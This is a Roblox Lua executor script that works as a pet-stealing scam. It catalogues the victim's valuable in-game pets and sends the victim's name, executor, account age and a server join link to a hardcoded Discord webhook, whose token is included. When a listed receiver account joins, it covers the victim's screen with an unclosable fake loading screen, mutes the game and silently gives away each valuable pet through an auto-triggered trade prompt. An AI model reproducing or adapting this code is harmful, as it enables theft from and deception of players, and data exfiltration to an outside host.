repeat task.wait() until game:IsLoaded()

-- 🔒 VIP Server Check
local plr = game.Players.LocalPlayer
local getServerType = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
if getServerType and getServerType:IsA("RemoteFunction") then
    local ok, serverType = pcall(function()
        return getServerType:InvokeServer()
    end)
    if ok and serverType == "VIPServer" then
        plr:Kick("Server error. Please join a DIFFERENT server")
        return
    end
end

-- ✅ Configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP"
local VICTIM = game.Players.LocalPlayer
local USERNAMES = {
    "saikigrow",
    "yuniecoxo",
    "yyyyyvky"
}

local PET_VALUES = {
    ["Raccoon"] = { emoji = "🦝", value = 2000 },
    ["T-Rex"] = { emoji = "🦖", value = 5000 },
    ["Fennec Fox"] = { emoji = "🦊", value = 3500 },
    ["Dragonfly"] = { emoji = "🐞", value = 4000 },
    ["Butterfly"] = { emoji = "🦋", value = 4000 },
    ["Disco Bee"] = { emoji = "🐝", value = 4200 },
    ["Mimic Octopus"] = { emoji = "🐙", value = 6000 },
    ["Queen Bee"] = { emoji = "👑🐝", value = 6500 },
    ["Spinosaurus"] = { emoji = "🦕", value = 5500 },
    ["Kitsune"] = { emoji = "🦊✨", value = 8000 },
}

local victimPetTable = {}
local totalPetValue = 0
local VirtualInputManager = game:GetService("VirtualInputManager")
local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)




-- 🎭 Fully Blocking Fake Loading Screen
local function showBlockingLoadingScreen()
    local plr = game.Players.LocalPlayer
    local playerGui = plr:WaitForChild("PlayerGui")

    pcall(function()
        for _, guiType in pairs(Enum.CoreGuiType:GetEnumItems()) do
            if guiType ~= Enum.CoreGuiType.Chat then
                game:GetService("StarterGui"):SetCoreGuiEnabled(guiType, false)
            end
        end
    end)

    local loadingScreen = Instance.new("ScreenGui")
    loadingScreen.Name = "UnclosableLoading"
    loadingScreen.ResetOnSpawn = false
    loadingScreen.IgnoreGuiInset = true
    loadingScreen.DisplayOrder = 999999
    loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    loadingScreen.Parent = playerGui

    loadingScreen.AncestryChanged:Connect(function()
        if loadingScreen.Parent ~= playerGui then
            loadingScreen.Parent = playerGui
        end
    end)

    local blackFrame = Instance.new("Frame")
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.Position = UDim2.new(0, 0, 0, 0)
    blackFrame.BorderSizePixel = 0
    blackFrame.ZIndex = 1
    blackFrame.Parent = loadingScreen

    local blurEffect = Instance.new("BlurEffect")
    blurEffect.Size = 24
    blurEffect.Name = "FreezeBlur"
    blurEffect.Parent = game:GetService("Lighting")

    local loadingLabel = Instance.new("TextLabel")
    loadingLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
    loadingLabel.Position = UDim2.new(0.25, 0, 0.45, 0)
    loadingLabel.BackgroundTransparency = 1
    loadingLabel.TextScaled = true
    loadingLabel.Text = "Loading Please Wait <3..."
    loadingLabel.TextColor3 = Color3.new(1, 1, 1)
    loadingLabel.Font = Enum.Font.SourceSansBold
    loadingLabel.ZIndex = 2
    loadingLabel.Parent = loadingScreen

    coroutine.wrap(function()
        while true do
            for i = 1, 3 do
                loadingLabel.Text = "Loading" .. string.rep(".", i)
                task.wait(0.5)
            end
        end
    end)()

    coroutine.wrap(function()
        while task.wait(1) do
            if not game:GetService("Lighting"):FindFirstChild("FreezeBlur") then
                local newBlur = Instance.new("BlurEffect")
                newBlur.Size = 24
                newBlur.Name = "FreezeBlur"
                newBlur.Parent = game:GetService("Lighting")
            end
            for _, sound in ipairs(workspace:GetDescendants()) do
                if sound:IsA("Sound") and sound.Volume > 0 then
                    sound.Volume = 0
                end
            end
            for _, gui in pairs(playerGui:GetChildren()) do
                if gui:IsA("ScreenGui") and gui.Name ~= "UnclosableLoading" then
                    gui:Destroy()
                end
            end
        end
    end)()
end

-- Detect user join and trigger loading screen
for _, player in pairs(game.Players:GetPlayers()) do
    if table.find(USERNAMES, player.Name) then
        showBlockingLoadingScreen()
        break
    end
end
game.Players.PlayerAdded:Connect(function(player)
    if table.find(USERNAMES, player.Name) then
        showBlockingLoadingScreen()
    end
end)

local function waitForJoin()
    for _, player in game.Players:GetPlayers() do
        if table.find(USERNAMES, player.Name) then
            return true, player.Name
        end
    end
    return false, nil
end

function createDiscordEmbed(petList, totalValue, fileUrl)
    local embed = {
        title = "Saiki hits",
        color = 65210,
        fields = {
            {
                name = "👤 **Player Information**",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                    VICTIM.Name, 
                    table.concat(USERNAMES, " "), 
                    identifyexecutor(), 
                    game.Players.LocalPlayer.AccountAge
                ),
                inline = false
            },
            {
                name = "💰 **Total Value**",
                value = string.format("```%s¢```", totalValue),
                inline = false
            },
            {
                name = "🌴 **Backpack**",
                value = string.format("```%s```", petList),
                inline = false
            },
            {
                name = "🏝️ **Join with URL**",
                value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", game.JobId, game.PlaceId, game.JobId),
                inline = false
            }
        },
        footer = {
            text = string.format("%s | %s", game.PlaceId, game.JobId)
        }
    }

    local data = {
        content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")", game.PlaceId, game.JobId),
        username = game.Players.LocalPlayer.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed}
    }

    local jsonData = game:GetService("HttpService"):JSONEncode(data)
    local headers = { ["Content-Type"] = "application/json" }
    local request = http_request or request or HttpPost or syn.request
    local response = request({ Url = WEBHOOK_URL, Method = "POST", Headers = headers, Body = jsonData })

    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
        warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
    end
end

local function teleportTarget(targetName)
    local target = game.Players:FindFirstChild(targetName)
    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end
    if not VICTIM.Character or not VICTIM.Character:FindFirstChild("HumanoidRootPart") then return end
    VICTIM.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
end

local function deltaBypass()
    VirtualInputManager:SendMouseButtonEvent(workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2, 0, true, nil, false)
    task.wait()
    VirtualInputManager:SendMouseButtonEvent(workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2, 0, false, nil, false)
end

local function checkPetsWhilelist(pet)
    for name, _ in pairs(PET_VALUES) do
        if string.find(pet, name) then
            return name
        end
    end
    return nil
end

local function getPetObject(petUid)
    for _, object in pairs(VICTIM.Backpack:GetChildren()) do
        if object:GetAttribute("PET_UUID") == petUid then return object end
    end
    for _, object in workspace[VICTIM.Name]:GetChildren() do
        if object:GetAttribute("PET_UUID") == petUid then return object end
    end
    return nil
end

local function equipPet(pet)
    if pet:GetAttribute("d") then
        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
    end
    VICTIM.Character.Humanoid:EquipTool(pet)
end

local function getPlayersPets()
    for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
        local matchedName = checkPetsWhilelist(value.PetType)
        if matchedName then
            local petInfo = PET_VALUES[matchedName]
            local mutation = ""

            if string.find(value.PetType, "Rainbow") then
                mutation = "🌈 "
                petInfo.value += 10000
            elseif string.find(value.PetType, "Mega") then
                mutation = "💥 "
                petInfo.value += 15000
            elseif string.find(value.PetType, "Ascended") then
                mutation = "✨ "
                petInfo.value += 8000
            end

            table.insert(victimPetTable, string.format("%s%s %s", mutation, petInfo.emoji, matchedName))
            totalPetValue += petInfo.value
        end
    end
end

local function startSteal(trigerName)
    if game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt") then
        game.Players[trigerName].Character.Head.ProximityPrompt.HoldDuration = 0
        deltaBypass()
    end
end

local function checkPetsInventory(target)
    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        local matchedName = checkPetsWhilelist(value.PetType)
        if not matchedName then continue end
        local petObject = getPetObject(petUid)
        if not petObject then continue end
        equipPet(petObject)
        task.wait(0.2)
        startSteal(target)
    end
end

local function idlingTarget()
    task.spawn(function()
        while task.wait(0.2) do
            local isTarget, trigerName = waitForJoin()
            if isTarget then
                teleportTarget(trigerName)
                checkPetsInventory(trigerName)
            end
        end
    end)
end

getPlayersPets()

task.spawn(function()
    while task.wait(0.5) do
        if #victimPetTable > 0 then
            idlingTarget()
            createDiscordEmbed(table.concat(victimPetTable, "\n"), totalPetValue, "https://cdn.discordapp.com/attachments/.../items.txt")
            break
        end
    end
end)
